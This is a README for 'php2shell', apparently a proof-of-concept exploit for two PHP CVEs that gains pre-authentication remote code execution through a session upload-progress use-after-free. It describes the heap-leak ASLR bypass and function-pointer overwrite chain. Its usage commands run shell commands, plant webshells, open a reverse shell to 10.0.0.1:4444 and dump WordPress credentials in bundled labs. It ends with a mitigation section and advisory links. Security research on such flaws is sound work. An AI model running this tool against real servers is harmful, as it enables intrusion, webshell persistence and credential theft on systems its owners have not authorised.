# php2shell

PHP proof of concept for **CVE-2026-109618** / **CVE-2026-109619**.

Pre-auth, cookie-less, pure-HTTP remote code execution via `session.upload_progress` use-after-free. Heap-based ASLR bypass + function pointer overwrite = shell.

**Author: [agrresore](https://github.com/agrresore)**

**Repository: [agrresore/php2shell](https://github.com/agrresore/php2shell)**

## Disclaimer

**Authorized security testing, research, and education ONLY.** Unauthorized access is illegal. Authors not responsible for misuse.

## Affected Versions

| Branch | Vulnerable | Patched |
|--------|-----------|---------|
| PHP 8.5 | < 8.5.12 | 8.5.12+ |
| PHP 8.4 | < 8.4.27 | 8.4.27+ |
| PHP 8.3 | < 8.3.36 | 8.3.36+ |
| PHP 8.2 | < 8.2.35 | 8.2.35+ |
| PHP 8.1/8.0/7.x | All | EOL |

## Features

- Pre-auth RCE — no credentials, no cookies, pure HTTP
- ASLR bypass via ~800KB heap OOB read
- In-band output via two-stage webshell (HTTP GET, instant response)
- File-based output fallback (Docker labs, read-only webroot)
- Interactive shell + reverse shell modes
- Auto-detect arch (x86_64/aarch64), OS, SAPI, MPM
- Profile system with auto-calibration
- Worker pinning for multi-worker Apache pools

## Requirements

- Python 3.10 or newer; Python code uses the standard library only.
- Docker with the Compose plugin for the bundled labs.
- Offsets matching the exact PHP binary and architecture.

## Limitations

This PoC includes build-specific profiles and labs based on Apache mod_php.
A vulnerable PHP version alone does not establish that this PoC will work.
Fingerprinting is heuristic, and distribution packages may contain backported fixes.
The exploit can crash PHP workers and may write temporary files or a webshell.
The included profiles and earlier demonstration results have not been independently
revalidated as part of this repository cleanup.

The lab passwords and phpMyAdmin secret are intentionally public test values.
The Compose files bind HTTP ports to localhost. Use the labs in an isolated environment.

## Quick Start

```bash
git clone https://github.com/agrresore/php2shell.git
cd php2shell
python3 exploit.py --help
```


```bash
# 1. Start lab
cd docker && docker compose up -d && cd ..

# 2. Extract offsets
python3 -c "
from lib.offsets import extract_from_container, save_offsets_env
z, d = extract_from_container('php2shell-target')
save_offsets_env('out/offsets.env', z, d)
print(f'zif_system=0x{z:x}  zval_ptr_dtor=0x{d:x}')
"

# 3. Recon only
python3 exploit.py -t http://127.0.0.1:18110/index.php --recon-only

# 4. Single command (file-based output via /out/)
python3 exploit.py -t http://127.0.0.1:18110/index.php --cmd id

# 5. Interactive shell (webshell in-band, auto-fallback)
python3 exploit.py -t http://127.0.0.1:18110/index.php -i

# 6. Webshell mode for single command
python3 exploit.py -t http://127.0.0.1:18110/index.php --cmd id --mode webshell

# 7. Reverse shell
python3 exploit.py -t http://127.0.0.1:18110/index.php --reverse 10.0.0.1:4444
```

## Exploit Chain

```
A1  OOM → dangling PS(id) + PS(mod_data)
B1  Stale-ID OOB read → ~800KB heap leak → libphp base + chunk base
A2  Cheap OOM → dangling PS(http_session_vars)
B2  Fake-ref spray → pDestructor=zif_system → system(cmd)
```

**In-band execution (two-stage):**
1. B2 plants PHP webshell on webroot (worker crashes, one-time cost)
2. Subsequent commands via HTTP GET — output in response body
3. Auto-cleanup on exit

## Execution Modes

| Mode | Flag | How |
|------|------|-----|
| Single cmd | `--cmd "id"` | File-based via /out/ |
| Webshell | `--mode webshell --cmd "id"` | Plant + execute + cleanup |
| Interactive | `-i` | Webshell (auto file fallback) |
| File I/O | `-i --mode file` | Each cmd = fresh exploit chain |
| Reverse shell | `--reverse IP:PORT` | Bash/python/perl/nc/php |

## Architecture

```
exploit.py           Pipeline orchestrator
recon.py             Target fingerprinting
lib/
├── transport.py     HTTP transport (chunked, proxy)
├── payloads.py      Multipart builders (A1, B1, fake HashTable)
├── leak.py          OOB leak parser + ASLR bypass
├── oom.py           A2 cheap-OOM
├── forge.py         B2 fake-reference spray
├── calibrate.py     Auto-calibration
├── offset_db.py     Profile database
├── offsets.py       ELF symbol extraction
└── worker_pin.py    Worker pinning
profiles/            JSON profiles for known PHP builds
docker/              Minimal PHP lab (port 18110)
labs/
├── wordpress/       WordPress + MariaDB lab (port 18120)
└── phpmyadmin/      phpMyAdmin + MariaDB lab (port 18130)
```

## Adding Profiles

```bash
# From container
python3 -c "
from lib.offsets import extract_from_container
z, d = extract_from_container('container-name')
print(f'zif_system: 0x{z:x}  zval_ptr_dtor: 0x{d:x}')
"

# From libphp.so
python3 -c "
from lib.offsets import extract_from_elf
z, d = extract_from_elf('/path/to/libphp.so')
"
```

## Labs

### Minimal PHP (default)
```bash
cd docker && docker compose up -d
# Port 18110 — bare PHP 8.4.26, single-worker prefork
python3 exploit.py -t http://127.0.0.1:18110/index.php -i
```

### WordPress
```bash
cd labs/wordpress && docker compose up -d
# Port 18120 — WordPress (downloaded from latest.tar.gz at build time) + MariaDB 11
# Use any lightweight endpoint (WP bootstrap too heavy for B1 heap layout)
python3 exploit.py -t http://127.0.0.1:18120/health.php -i
# Dumps wp-config.php creds, plants webshell, full interactive shell
```

### phpMyAdmin
```bash
cd labs/phpmyadmin && docker compose up -d
# Port 18130 — phpMyAdmin 5.2.2 + MariaDB 11
python3 exploit.py -t http://127.0.0.1:18130/favicon.ico -i
```

> **Note:** This PoC targets PHP's `session.upload_progress` lifecycle. Reachability depends on the SAPI, request routing, configuration, worker reuse, and matching build offsets. The bundled labs do not establish compatibility with every PHP application or deployment.

## Mitigation

Upgrade to a patched PHP release (8.2.35, 8.3.36, 8.4.27, 8.5.12 or a later
release in the corresponding branch), or install the vendor's backported fix,
and restart PHP workers. Consult the official advisories below for each issue.

Disabling `session.upload_progress.enabled` administratively and restarting
workers removes the demonstrated session upload-progress path. It is not a
complete mitigation for all paths covered by these CVEs.

## References

- [PHP official advisory: CVE-2026-109618](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w)
- [PHP official advisory: CVE-2026-109619](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp)

## License

MIT. See [LICENSE](LICENSE).
